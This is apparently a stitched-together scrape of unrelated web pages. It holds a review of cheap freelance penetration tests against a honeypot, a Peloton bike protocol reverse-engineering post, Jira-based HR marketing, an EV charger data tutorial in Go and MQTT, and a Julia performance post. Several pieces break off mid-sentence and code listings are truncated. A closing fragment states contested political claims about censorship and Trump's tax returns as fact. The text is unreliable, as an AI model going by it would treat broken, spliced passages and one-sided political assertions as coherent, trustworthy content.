<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>




<h3>
Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.
</p>

<p>Following is a table that summarizes the work of all testers:</p>

</table>

<p>
The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>

        <p><strong><span>TL</span>;<span>DR</span></strong> - I’ve decoded (most of) the protocol that the Peloton bike uses to

data during a ride, without interfering with the Peloton software, to

<p>We have a Peloton at home. Originally, I was skeptical, but then I found
trainers I like and it’s fun to ride with friends. And really takes the edge
off all-day Zoom meetings to ride during a meeting with the camera turned&nbsp;off.</p>
<p>But, being the guy that I am, I’ve been curious about how the head unit —
which runs a lightly skinned Android — was collecting stats
from the actual bike. I was also a bit annoyed that though the Peloton software
will happily read data from an <span>HR</span> sensor, and will upload your ride data to
Strava, there was no way for it to <em>broadcast</em> data about a ride to a local
fitness appliance — which meant that although I could track the fact that I
was doing an “indoor bike” ride on my Garmin watch, the watch would see a 0
mile ride because it got no bike&nbsp;data.</p>
<p>Then a couple months ago, I came across
<a href="https://ptx2.net/posts/unbricking-a-bike-with-a-raspberry-pi/">this blog post</a>
in which someone on the Internet was able to hook up their (bricked) Flywheel
bike to Zwift using a Raspberry Pi to decode the bike sensor data and broadcast
it over Bluetooth — and I was inspired to finally give this project a shot.
What should we call a device broadcasting stats from the Peloton, monitoring it
if you will? How about&nbsp;“PeloMon”?</p>
<p>Let’s get down to&nbsp;it.</p>

<p>There are only two cables that plug into the tablet: a barrel jack carrying
<span>DC</span> power @ 12V (coming from the power brick), and a <span>TRRS</span> connector —
think “stereo aux cable”. So the data is clearly coming in on the latter.
Since I only wanted to observe the traffic between the <span>HU</span> and the bike,
not interrupt it, I used a headphone splitter cable to split the cable from the bike with an extra jack, and connected an aux cable from that extra jack
to the breakout. Such a connection might disrupt some high-speed communications
protocols, but my guess was that a) there wasn’t going to be that much traffic
to require anything fancy, b) nothing fast would be running over 3.5mm <span>TRRS</span>, and
c) this interface would be engineered with pretty wide tolerances for stability 
in a home environment. (Spoiler alert: all of these were&nbsp;true.)</p>
<p>The first step was to identify the pinout from the jack as best
as possible. Probing the leads with a <span>DMM</span> with the bike active showed that
Ring2 was at ground (0V with respect to the power supply’s ground)
with -5.5-6V between tip or ring1 and ground. Sleeve also appears to be
at ground, but it and Ring2 may not quite be the same (more on this later).
The negative voltages with respect
to ground are a pretty strong sign that we’re going to see <span>RS</span>-232&nbsp;signaling.</p>
<h2 id="decoding-the-wire-protocol-with-a-logic-analyzer"><a href="#decoding-the-wire-protocol-with-a-logic-analyzer">Decoding the wire protocol with a logic&nbsp;analyzer</a></h2>
<p>(If you’d like to load a PulseView trace to see the data for yourself, one session
file from a test ride is located in <code>peloton_decoding/resistance-stepped-10s.sr</code>
in <a href="https://github.com/ihaque/pelomon">the PeloMon GitHub repository</a>.)</p>
<p>Normally I’d wire up the breakout and hack something together on the Arduino
I have sitting around, but it turns out that logic analyzers have gotten
<em>really really cheap</em> so I splurged on a $12.50 one and thought I’d give it
a whirl — turned out to be a great idea that made it <span>WAY</span> easier to decode
the signals. With complete abandon regarding ground isolation and the voltage
tolerances of the <span>LA</span> (is it supposed to be able to handle negative voltage?),
I hooked it up to see what I’d get. These cheapo LAs emulate a Saleae Logic
analyzer and work fine in the open-source <a href="https://sigrok.org/wiki/PulseView">PulseView</a>&nbsp;software.</p>
<p><img alt="Hooking up the LA with D0 on tip, D4 on ring1, D5 on sleeve, and GND on ring2" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-4ring1-5sleeve-gndring2.png">
</p><center><strong>Hooking up the <span>LA</span> with D0 on tip, D4 on ring1, D5 on sleeve, and <span>GND</span> on ring2</strong></center>
<p><img alt="D0 on tip, D2 on ring1, D4 on ring2, and GND on sleeve" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-2ring1-4ring2-gndsleeve.png">
</p><center><strong>D0 on tip, D2 on ring1, D4 on ring2, and <span>GND</span> on sleeve</strong></center>
<p>There’s pretty clearly serial signaling going on over these wires! One
party seems to be sending requests on Tip every 100ms, and the other
party responds about a millisecond later on Ring1. While it wasn’t obvious
from the <span>DMM</span> whether signaling <span>GND</span> should be on Ring2 or Sleeve, from the <span>LA</span>
traces, it looks like there is less glitching on the response line if Ring2 is
used as <span>GND</span> - so we’ll do that. The narrow pulses are probably single bits,
so sampling at a high rate (a few hundred kHz) lets us measure the bit
rate as&nbsp;19200bps:</p>
<p><img alt="Counting samples in the LA shows a 19.2kHz signal" src="https://ihaque.org/static/img/2020/10/20201015-pinout-19200bps.png">
</p><center><strong>Counting samples in the <span>LA</span> shows a 19.2kHz signal</strong></center>
<p>PulseView also lets you add protocol decoders to particular wires. I put a <span>UART</span>
decoder on with D0 as “<span>RX</span>” and D4 as “<span>TX</span>”, and saw data, but with a ton of
low-level serial protocol errors. UARTs invert the signal going out on the wire
with the expectation that there will be another <span>UART</span> at the other end to
re-invert. Since we don’t have that second <span>UART</span>, we have to turn the “Invert <span>RX</span>”
and “Invert <span>TX</span>” options on in PulseView, and then we see clean data! I also
experimented with other serial options (data, parity, and stop bits), but the
first guess of 8N1 turned out&nbsp;correct.</p>
<p><img alt="Without inversion enabled, we see framing errors and break conditions" src="https://ihaque.org/static/img/2020/10/20201015-missing-inversion.png">
</p><center><strong>Without inversion enabled, we see framing errors and break conditions</strong></center>
<p><img alt="Turning on the inversion in software, we see data with no serial errors!" src="https://ihaque.org/static/img/2020/10/20201015-fixed-inversion.png">
</p><center><strong>Turning on the inversion in software, we see data with no serial errors!</strong></center>
<p>Following the data streams, we see that the data stream on the
Tip wire during a ride always consists of one of three different four-byte
packets, repeated round-robin every 100ms, with the responses on Ring1 to these
requests being longer, different in length depending on the request type, and
variable in content.
It seems likely then that the Tip shows us signaling from the head unit to the
bike, and Ring1 is the bike responding to the head unit with information
about variables like current speed, resistance, or power&nbsp;output.</p>
<p><strong>Thus, we’ve worked out the physical layer protocol for the Peloton
communications: <span>RS</span>-232 at 5.5V and 19200bps 8N1 encoding, with <span>HU</span>-to-bike
communications on Tip, bike-to-<span>HU</span> on Ring1, <span>GND</span> on Ring2, and something
ground-like on&nbsp;Sleeve.</strong></p>

<p>To investigate the encoding between the head unit and the bike, I used the
logic analyzer to capture a trace of the communications during a ride. (Shoutout
to Ben Alldis and his Ministry of Sound ride series!)
The data dump and scripts are available in the GitHub repository for this project
at https://github.com/ihaque/pelomon/, in the <code>peloton_decoding</code> subdirectory.)</p>
<h2 id="basic-packet-structure"><a href="#basic-packet-structure">Basic packet&nbsp;structure</a></h2>
<p>(To follow along, run <code>peloton_decoding/decoder_plots.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>During a ride, about every 100ms (100.66-100.8ms) the <span>HU</span> sends a request
to the bike, and the bike responds about 300us (i.e., 0.3ms) from the end
of the <span>HU</span>’s request. The <span>HU</span> sends three different request packets round robin.
Each request type has a different response length from the&nbsp;bike:</p>
<table> 
<tbody><tr><th><span>HU</span> Request</th><th>Bike Response Length</th><th>Example Bike Response</th></tr>
<tr><td><tt>F5 41 36 F6</tt></td><td>8 bytes</td><td><tt>F1 41 03 30 30 30 C5 F6</tt></td></tr>
<tr><td><tt>F5 44 39 F6</tt></td><td>10 bytes</td><td><tt>F1 44 05 30 30 30 30 30 2A F6</tt></td></tr>
<tr><td><tt>F5 4A 3F F6</tt></td><td>9 bytes</td><td><tt>F1 4A 04 38 36 36 30 13 F6</tt></td></tr>
</tbody></table>

<p>A few things are evident from simple inspection of the&nbsp;bytes:</p>
<ul>
<li>The first byte is a header - seems to be F5 from the <span>HU</span> and F1 from the&nbsp;bike.</li>
<li>All packets end in&nbsp;F6.</li>
<li>The second byte that the <span>HU</span> sends seems to be a request type, and is mirrored in the second byte in the bike’s&nbsp;response.</li>
<li>The third byte of the bike response is the length of the full packet minus 5 — probably indicates the length of the data payload following&nbsp;it.</li>
<li>Serial packets often carry a checksum, and here the second-to-last byte from either the <span>HU</span> or the bike seems to be that: it’s the sum (modulo 256) of all the bytes preceding&nbsp;it.</li>
</ul>
<p>Thus, the packet format seems to&nbsp;be:</p>
<ul>
<li><span>HU</span>: <code>F5 [request type] [checksum] F6</code></li>
<li>Bike: <code>F1 [request type] [payload length] [response bytes 1-n] [checksum] F6</code></li>
</ul>
<p>We can now throw together a quick plot of each response byte to look for&nbsp;patterns.</p>
<p><img alt="Bytewise plot of Peloton response data for common request packets during part of a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-bytewise.png">
</p><center><strong>Bytewise plot of Peloton response data for common request packets during part of a ride</strong></center>
<p>It appears that every byte ranges from 0x30 to 0x39 — which is exactly the
<span>ASCII</span> range for decimal digits 0 through 9. Furthermore, the earlier bytes in
each packet appear to vary more quickly than the later ones through a ride,
suggesting that the least-significant digit comes first. <strong>The Peloton bike
is encoding its responses as little-endian <span>ASCII</span> digits.</strong> It’s easy enough
to dump a plot of these values per response type now that we know the&nbsp;encoding:</p>
<p><img alt="Decoded values sent by bike to head unit during a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-ascii.png">

<p>(To follow along, run <code>peloton_decoding/decode_resistance.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>Glancing at these graphs it’s pretty clear that we have ride data of the Peloton
trifecta — cadence, power, and resistance — with a couple weird things thrown in
for flavor. Comparing to the Peloton ride stats, <strong>request type 0x41 seems to directly

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Your HR deserves better</h2><p>HR employees have to deal with lots of activities and services that seem disconnected, at least from a technical point of view. They receive requests for new employees and positions from various units, prepare and upload job ads on the company’s website, review received job applications, forward suitable applications to corresponding teams and units, organize interviews based on the position and target unit’s preferences, receive feedback and – upon admission – devise employment contracts and plan and execute the onboarding process. As for current employees, they provide various services including issuing official documents and certificates, organizing educational programs and workshops for personal and professional development of employees and handling numerous other personal, legal and financial cases and activities and status reports. And often, they do not have proper tools to manage and steer all these interconnected procedures without too much unnecessary manual work.</p><h3>Scenario I: silo tools, overwhelmed HR staff and lack of unified reporting and monitoring</h3><p>The HR department in Company A has various tools for different topics, e.g. vacation requests, employment contracts or wage &amp; salary management. It pays about 200K per year for those few tools. The rest of the activities are tracked in Excel, and documents are handled on a file server. During the recruiting process, they mainly use email to communicate with other departments and the applicants and store information on job ads, job applications and expense management in various large Excel files. As an example, an HR employee needs to communicate manually with website admins to update job ads, and send informational messages, notifications and reminders by looking into her calendar or the aforementioned Excel files. She then has to prepare a contract by copy-pasting information and contact IT and other relevant departments in order to trigger necessary on-boarding steps. She also has to provide meaningful reports on number of job applications, expenses, contracts and requests. This reporting process takes a big chunk of her time since a few Excel files need to be merged, and the resulting diagrams have to be extracted and put into a PowerPoint presentation. All these activities consume a huge amount of her time and energy.</p><p>Moreover, management does not have real-time status reports and monitoring measures, since the reports are generated in intervals, sometimes weeks later.</p><div id="attachment_78438"><p><a href="https://blog.codecentric.de/files/2020/10/HR-tool-chaos.png"><img aria-describedby="caption-attachment-78438" loading="lazy" src="https://blog.codecentric.de/files/2020/10/HR-tool-chaos-700x409.png" alt="the need for an hr synergy solution" width="700" height="409" srcset="https://blog.codecentric.de/files/2020/10/HR-tool-chaos-700x409.png 700w, https://blog.codecentric.de/files/2020/10/HR-tool-chaos-250x146.png 250w, https://blog.codecentric.de/files/2020/10/HR-tool-chaos-768x448.png 768w, https://blog.codecentric.de/files/2020/10/HR-tool-chaos-120x70.png 120w, https://blog.codecentric.de/files/2020/10/HR-tool-chaos.png 1292w" sizes="(max-width: 700px) 100vw, 700px"></a></p><p id="caption-attachment-78438">Tool and process chaos</p></div><h3>Scenario II: generating synergy by means of fully interconnected, integrated and automated modules</h3><p>Company B has <em>HR Synergy Solution</em> as its main platform and steers almost all its internal processes on that platform. Since different modules for job ads, job applications, interviews, contracts or on-boarding steps are interconnected, an HR employee at Company B has to carry out the minimum necessary manual work in order to manage all required activities. Activities are carried out based on an agreed workflow that includes all necessary steps in the process, and data is validated at every step automatically. Communications are done and protocolled either systematically on the corresponding case in the tool, or automatically by the system, if possible. Reminders are sent based on different status and defined deadlines and any report can be generated automatically and be available by a click in real-time. The reports are also connected to the actual data, so that decision makers can explore the provided data and make sense of different situations and results. And the most interesting part: Company B pays less than 50K yearly to use this platform.</p><p>Not many companies wish to find themselves trapped in Scenario I. However, that is sadly often the case. The question is how to make the transition from Scenario 1 to Scenario II, and reap the benefits on all financial, personal, legal and technological layers.</p><div id="attachment_78441"><p><a href="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution.png"><img aria-describedby="caption-attachment-78441" loading="lazy" src="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-700x377.png" alt="HR Synergy Solution" width="700" height="377" srcset="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-700x377.png 700w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-250x135.png 250w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-768x413.png 768w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-120x65.png 120w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution.png 1293w" sizes="(max-width: 700px) 100vw, 700px"></a></p><p id="caption-attachment-78441">Managing HR processes with codecentric’s HR Synergy Solution</p></div><h2>Our solution</h2><p>We use Jira as infrastructure for workflow engine, user and reporting management, and customize different interconnected workflows to create a personalized solution based on all organizational, legal and technical requirements within a company. By help of various add-ons, we have created a landscape on which HR departments can handle recruiting, contract management and on-boarding process seamlessly. Management also has direct access to dashboards. Statistics and monitoring information are available based on what insight decision makers need and what cockpit an HR employee requires to easily handle his or her daily work. All steps than can be automated and are carried out automatically. This includes emails to applicants (e.g. for requesting information, informing them about a decision, etc.), notifications to other departments (e.g. about the results of an interview) and reminders to whoever is in charge of a certain step and has passed a deadline. Via various APIs, communications and interactions with other systems are done automatically. This includes the IT department for creating a new account, or the finance department for registering an application cost or a contract.</p><p>And as for all agile tools, our solution is not a finished black box, but an infrastructure that can be modified and adjusted continuously, based on new organizational, legal or technical demands.</p><h2>How does it work?</h2><h3>The concept of end-to-end process management</h3><div id="attachment_78445"><p><a href="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes.png"><img aria-describedby="caption-attachment-78445" loading="lazy" src="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-250x149.png" alt="HR processes and services" width="250" height="149" srcset="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-250x149.png 250w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-700x417.png 700w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-768x457.png 768w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-120x71.png 120w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes.png 1160w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-78445">HR processes &amp; services</p></div><p>End-to-end process management is a novel mindset that views seemingly isolated procedures within an organization as part of a bigger picture, which is the underlying process. This concept was introduced and theorized by <a href="https://en.wikipedia.org/wiki/Michael_Martin_Hammer" target="_blank" rel="noopener noreferrer">Michael Hammer</a> in his distinguished book, <a href="https://www.goodreads.com/book/show/8430461-faster-cheaper-better" target="_blank" rel="noopener noreferrer">Faster, Cheaper, Better</a>. From his point of view, procedures interact with each other by either triggering, updating or completing each other in a one- or bidirectional manner. And this interaction needs to be considered within a broader context, especially for reporting (KPIs) and accountability.</p><p>In the context of Human Resources, for example, the recruiting process is seen as the underlying ground that connects procedures such as job ad management, job application screening, interview planning, contract preparation and on-boarding. The process starts with an open position in form of a job ad, and ends with an admitted applicant starting their career in the company. Traditionally, companies use different tools for these procedures, ranging from Excel, email, Slack or Trello all the way to specialized tools for specific procedures (e.g. vacation management). This approach was inevitable until a decade ago, since the software industry was not able to produce a secure, scalable and easily customizable infrastructure to support all these different procedures in a coherent, fast and low-cost way.</p><p>The technology simply wasn’t ripe for such comprehensive development and rapid adjustments. This brings us to the newly emerged concept of low-code platforms.</p><h3>Low-code platforms: 3D printers of the software industry</h3><p>Low-code platforms, including Jira, WordPress, Salesforce or Drupal are built upon the concept of software development by configuration, which means using flexible configuration panels instead of writing, compiling and deploying hundreds of lines of code. It immensely reduces the development, test and rollout time and takes advantage of modular implementation and add-on-based expansion.</p><p>These platforms generally provide an infrastructure with basic functionalities and modules such as user administration &amp; authentication, permission concept, dashboards, a workflow engine, communication venues (via e.g. sharing and commenting functionalities), custom content types and web-forms. They also provide an open API for third-party vendors to develop add-ons (apps) with particular purposes and functionalities (e.g. PDF export, BI reporting, visualizations, attachment management, dynamic forms, API management, etc.).</p><p>The time of buying a software and having to deal with its limitations and to come up with various workarounds in order to get the job done is passed. Now, companies can get a pre-configured platform, and then adjust it to comply with their requirements fully and reliably.</p><h3>Jira, a platform to enable end-to-end and fully-individualized process management</h3><p>Jira has proved to be one of the top low-code workflow engines in recent years. Its openness as a platform has also provided an opportunity for third-party vendors to fill the gap on areas where Atlassian itself is lagging behind. When a combination of well-thought-out add-ons are put together with a scalable permission concept, ANY process can be implemented on Jira (see for example <a href="https://pujanz.atlassian.net/wiki/spaces/DBWJIRA/overview" target="_blank" rel="noopener noreferrer">Shaping a Digital Beauty with Jira</a>, for a comprehensive guide), and within an astonishingly short timeframe.</p><p>In one case, for instance, 25 processes within a medium-sized bank were implemented and rolled out on Jira (together with about 10 add-ons), with a comprehensive BI reporting and systematic communication methods, all within 18 months by a team of one business analyst and one developer. Not many platforms out there in the market can provide such flexibility and scalability, let alone cost-efficiency.</p><h2>Why is codecentric HR Synergy Solution one of the best in the market?</h2><p>HR Synergy Solution is one pre-configured set of projects, dashboards and other modules on Jira that is optimized for HR processes. The pre-configuration includes settings and features that are required by almost all HR departments, which comprises of about 70% of total features. The remaining 30% is always completed by knowing the exact requirements of each HR department. Generalization and workarounds in software belong in the 20th century. It is now time to offer tools that are 100% individualized and can be adjusted constantly based on new requirements and situations. And that is what our HR Synergy Solution offers.</p><p><strong>For more information contact </strong>Adrian Voigt (<a href="mailto:adrian.voigt@codecentric.de" target="_blank" rel="noopener noreferrer">adrian.voigt@codecentr…</a></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>With the increasing popularity and availability of battery electric vehicles, privately-owned charger infrastructure at home or on company premises has become more and more common.</p><p>A vehicle charger is much more than a simple mains socket – it contains a computer or at least a programmable logic controller (PLC) which keeps track of power levels, consumption, and state. Having access to this data can be very useful for the owner, for example for custom billing or energy management purposes. Existing proprietary solutions offered by the manufacturers do not necessarily guarantee a full match with the customer’s requirements regarding costs and connectivity.</p><p>So, let’s “rescue” the data from the charger and store it in our own infrastructure.</p><p>This article serves two primary purposes. First, it outlines a simple solution on how to acquire charger data for your own analysis purposes. Second, it can be used as a tutorial for a tiny IoT use case with Golang, MQTT and TimescaleDB.</p><h2 id="obtaining-data-from-the-charger">Obtaining data from the charger</h2><p>At the time being, most chargers provide a management interface using a proprietary protocol with varying degrees of documentation. In case of the charger used for this article, a Mennekes Amtron, the control unit had ethernet and wireless connectivity, a mobile app, but no public documentation on the protocol.</p><p>In cases like that, some options for proceeding are:</p><ul><li>Ask the manufacturer for an API documentation</li><li>Analyze the network communication between management app and charger</li><li>Reverse-engineer a given piece of software, such as a mobile application</li></ul><p>Working together, the manufacturer is always the preferred way, and would surely be no issue on our charger. But supposing that the charger is an exotic model without sophisticated customer support, it might happen that obtaining an official API documentation does not succeed.</p><p>In this case, analyzing the network traffic between the mobile application and charger would be a least-invasive and promising next step. After setting up a network monitoring environment, i.e.&nbsp;<a href="https://www.wireshark.org/" noopener="" noreferrer"="" target="_blank">Wireshark</a> and a switch with monitoring port, and listening to the network traffic while using the mobile app, the following findings have been made:</p><ul><li>The charger uses a plaintext HTTP API listening on port 25000</li><li>The API prefix is /MHCP/1.0/</li><li>A client is considered as authenticated when it adds an http query parameter “devKey” with the value of the “Charger PIN1” from the manual</li><li>Request and response payload are JSON-encoded with human readable field names</li></ul><p>The listing below shows an example of a state document retrieved from an actual charger on <code>/MHCP/1.0/ChargeData?DevKey=0000</code>:</p><div id="cb1"><pre><code><span id="cb1-1"><span>{</span></span>

Furthermore, having different charger types and interfaces would require our server infrastructure to be aware of multiple different communication protocols and their revisions. To protect the charger from attackers and provide a common protocol for all chargers, we add a tiny edge device which suits as a protocol converter and connectivity provider.</p><p>For our use case, this task is done by a Raspberry Pi with a WiFi uplink on the charger’s ethernet port. The protocol converter and forwarding software is a Go binary which:</p><ul><li>periodically polls the HTTP interface from the PLC</li><li>connects to an MQTT server in the cloud</li><li>pushes changed charger state values to the MQTT server</li></ul><h3 id="charger-protocol-converter">Charger protocol converter</h3><p>The charger protocol converter’s primary task is to fetch the charger state, map it to a transfer data model and submit it to our cloud.</p><h4 id="fetching-the-current-state-from-the-charger">Fetching the current state from the charger</h4><p>The code below fetches the current state from the charger via an HTTP call and maps it to a generic charger state struct:</p><pre><code>func (m *MennekesMCP) GetCurrentChargerState() (state models.ChargerState, err error) {

The message brokers retain feature serves that purpose very well</li></ul><p>Because of its smaller footprint compared to AMQP and its popularity in the IoT field, we use <a href="https://blog.codecentric.de/en/2017/11/hello-mqtt-version-5-0/">MQTT</a> as messaging protocol.</p><p>Besides MQTT support in the connected applications, an MQTT broker is required. Depending on the overall setup, this could be a self-managed MQTT broker (such as <a href="https://mosquitto.org/" rel="noopener noreferrer" target="_blank">Mosquitto</a> or <a href="https://www.hivemq.com/" rel="noopener noreferrer" target="_blank">HiveMQ</a>) or a managed broker, i.e. <a href="https://blog.codecentric.de/en/2018/03/aws-iot-getting-sensordata/">AWS IoT</a> or Azure IoT. In this example, a Mosquitto instance is used.</p><h3 id="mqtt-topic-hierarchy-and-payload">MQTT topic hierarchy and payload</h3><p>The MQTT message properties relevant for this case are:</p><ul><li>the topic for routing and delivery purposes</li><li>the QoS statement defining the condition on which a message is considered delivered</li><li>a retain flag, which allows us to declare a message as the current value until a new one is published</li><li>the payload. MQTT is data-agnostic and regards the payload as an array of bytes</li></ul><p>We prefer a topic hierarchy based on charger id and variable name over a single topic for all variables for the following reasons:</p><ul><li>It reduces the complexity of a payload, because the topic already indicates what is inside</li><li>It reduces the load on the transport layer, because a fine-grained topic structure allows us to update only the values that have actually changed</li></ul><p>Both advantages really come in handy on constrained devices on low bandwidth or expensive connections.</p><p>The resulting topic structure is:</p><pre><code>chargers/{chargerName as defined}/{valueName as in shared data model}</code></pre><p>For example: For a variable “OperationState” on a charger called “carpark1”, the topic is <code>chargers/carpark1/OperationState</code>.</p><p>Concerning the payload, a simple solution would be to publish the byte representation of the value (in our case, a 64-bit ANSI float). Supposed that all other applications involved used the same method of floating point representation and don`t care about the time the published value was actually sampled or the latency is extremely low, this might be a viable solution.</p><p>In our use case, it is expected that the receiver of a telegram has to be aware of the actual sampling time, for instance for computing integrals over the current power consumption. So we need to include the sampling time into the telegram.</p><p>There are several ways to achieve this:</p><ul><li>Put the timestamp into the topic structure, which results in additional messages and increased complexity</li><li>Write the sampling timestamp into an MQTT5 header field</li><li>Instead of the raw value, emit a data structure which contains both timestamp and value</li></ul><p>For the given scenario, the third option appears as most reasonable. For the task of encoding a structure into a byte array, one could either use JSON or a data serialization framework, such as AVRO or Google Protocol Buffers. For the sake of simplicity and compatibility with managed solutions (especially their monitoring and debugging tools), we will use plain JSON.</p><h3 id="certificate-authentication">Certificate authentication</h3><p>MQTT and Mosquitto can be operated with plaintext passwords or even with no passwords at all. In a real-world environment, both edge device and broker should be authenticated and authorized, furthermore it should be possible to isolate device scopes and revoke compromised access credentials.</p><p>This requirements are resolved by using certificate-based authentication. The generation and deployment of the certificates might differ depending on the trust infrastructure used in production, for development purposes a self-signed set of certificates might suffice.</p><p>After deploying the certificates …</p></div></div>

false</code></pre><p>To remedy this, we could convert <code>p</code> to a tuple which has a static length, unlike a vector (which it currently is). However, then we won’t be able to do the indexing trick of <code>v[p]</code> to permute the entries of the vector. Instead, we’ll convert it to a <code>SVector</code> or static vector from <code>StaticArrays.jl</code>. This supports indexing like vectors, but is backed by a tuple of fixed length.</p><pre><code>julia&gt; using StaticArrays

julia&gt; p_static = SVector{d}(p)

julia&gt; isbits(p_static)
true</code></pre><p>We can then create a function <code>static_permute</code> which dispatches to a different method for every permutation. We do this by replacing the second argument with a parametric type <code>Val{p}</code>. We can then create a value type from our <code>isbits</code> vector <code>p_static</code> and act our new function on it.</p><pre><code>julia&gt; function static_permute(v, ::Val{p}) where {p}

In the dynamic version, which uses the <strong>same</strong> code for any (<code>Float64</code>) vector of any length, and any permutation, the code is a fair bit longer and more complicated. In fact, all of the code shown above is simply to deal with things like throwing out of bounds errors in case the vector <code>v</code> does not have entries at the indicies <code>p</code> asks for. Then at the end, we see a call to <code>Base._unsafe_getindex</code> which actually does the indexing once all the error-checking is done.</p><p>So could this huge performance advantage in the static case be partly to the fact that we don’t need to check that the indexing operation is valid, since we know the lengths of both <code>v</code> and <code>p</code> at compile time in that case? We can check by benchmarking:</p><pre><code>julia&gt; @btime Base._unsafe_getindex($(IndexLinear()), $v, $p)
  58.133 ns (1 allocation: 160 bytes)

 0.4046199953615772  
 0.3847457473964191  </code></pre><p>58 nanoseconds still; so the bounds checking and all does take a bit of time, but the dynamic version is still 10x slower. We can make an even more fair comparison (without the worrisome <code>unsafe</code> operation even) by simply making the vector <code>v</code> a static vector as well:</p><pre><code>julia&gt; v_static = SVector{d}(v)
10-element SArray{Tuple{10},Float64,1,10}:
 0.4046199953615772

 0.9869789349740046  
 0.575286289206322 </code></pre><p>Since <code>v_static</code> has a different type than <code>v</code>, we can call <code>dynamic_permute(v_static, p_static)</code> which will generate new code specifically for these static types. That is, when we call <code>dynamic_permute(v_static, p_static)</code>, the compiler will generate code to do the permutation knowing the length of …</p></div></div>

<p>Over the course of 2020, we’ve seen increased censorship from every major digital content platform. It culminated with both Facebook and Twitter blocking a New York Post article, which alleged Joe Biden’s son was involved in illegal activity and corruption<sup id="fnref:2"><a href="#fn:2">1</a></sup>. Meanwhile, the New York Times published a scathing article on Donald Trump’s tax returns. None of the major networks restricted access to the tax story, even though it was likely those tax records were obtained illegally<sup id="fnref:4"><a href="#fn:4">2</a></sup>, and nothing in the returns was truly out of the ordinary<sup id="fnref:3"><a href="#fn:3">3</a></sup>.</p>

